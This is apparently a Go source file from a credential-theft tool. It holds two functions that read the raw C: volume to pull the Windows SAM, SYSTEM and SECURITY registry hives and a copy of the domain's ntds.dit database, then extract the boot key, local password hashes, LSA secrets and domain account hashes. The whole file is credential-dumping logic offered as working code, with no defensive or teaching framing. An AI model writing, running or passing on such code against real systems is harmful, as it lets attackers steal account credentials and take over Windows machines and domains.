package creds

import "fmt"

func DumpHashes() (*DumpResult, error) {
	volumePath := `\\.\C:`

	volumeHandle, err := OpenVolume(volumePath)
	if err != nil {
		return nil, fmt.Errorf("access denied: must run as administrator")
	}
	defer CloseHandle(volumeHandle)

	ntfs, err := ReadNTFSBoot(volumeHandle)
	if err != nil {
		return nil, fmt.Errorf("failed to read ntfs boot sector: %w", err)
	}

	samData := ExtractFile(volumeHandle, ntfs, `C:\Windows\System32\config\SAM`)
	systemData := ExtractFile(volumeHandle, ntfs, `C:\Windows\System32\config\SYSTEM`)
	securityData := ExtractFile(volumeHandle, ntfs, `C:\Windows\System32\config\SECURITY`)

	if samData == nil || systemData == nil {
		return nil, fmt.Errorf("failed to extract registry hives")
	}

	bootKey, domainName, isDomainJoined := ParseSYSTEM(systemData)
	if bootKey == nil {
		return nil, fmt.Errorf("failed to extract bootkey")
	}

	result := &DumpResult{
		BootKey:	bootKey,
		ComputerName:	GetComputerName(systemData),
		DomainName:	domainName,
		IsDomainJoined:	isDomainJoined,
		Credentials:	make(map[string]*Credential),
	}

	ExtractedCredentials = result.Credentials

	if samData != nil {
		ParseSAM(samData, bootKey)
	}

	if securityData != nil {
		result.LSASecrets = ParseSECURITY(securityData, bootKey, domainName, isDomainJoined)
	}

	return result, nil
}

func DumpNTDS() (*DumpResult, error) {
	volumePath := `\\.\C:`

	volumeHandle, err := OpenVolume(volumePath)
	if err != nil {
		return nil, fmt.Errorf("access denied: must run as administrator")
	}
	defer CloseHandle(volumeHandle)

	ntfs, err := ReadNTFSBoot(volumeHandle)
	if err != nil {
		return nil, fmt.Errorf("failed to read ntfs boot sector: %w", err)
	}

	systemData := ExtractFile(volumeHandle, ntfs, `C:\Windows\System32\config\SYSTEM`)
	if systemData == nil {
		return nil, fmt.Errorf("failed to extract system hive")
	}

	bootKey, domainName, isDomainJoined := ParseSYSTEM(systemData)
	if bootKey == nil {
		return nil, fmt.Errorf("failed to extract bootkey")
	}

	ntdsPath, err := createNTDSCopy()
	if err != nil {
		return nil, fmt.Errorf("failed to extract ntds.dit: %w", err)
	}

	hashes, err := ParseNTDS(ntdsPath, bootKey)
	if err != nil {
		return nil, err
	}

	result := &DumpResult{
		BootKey:	bootKey,
		ComputerName:	GetComputerName(systemData),
		DomainName:	domainName,
		IsDomainJoined:	isDomainJoined,
		NTDSHashes:	hashes,
	}

	return result, nil
}

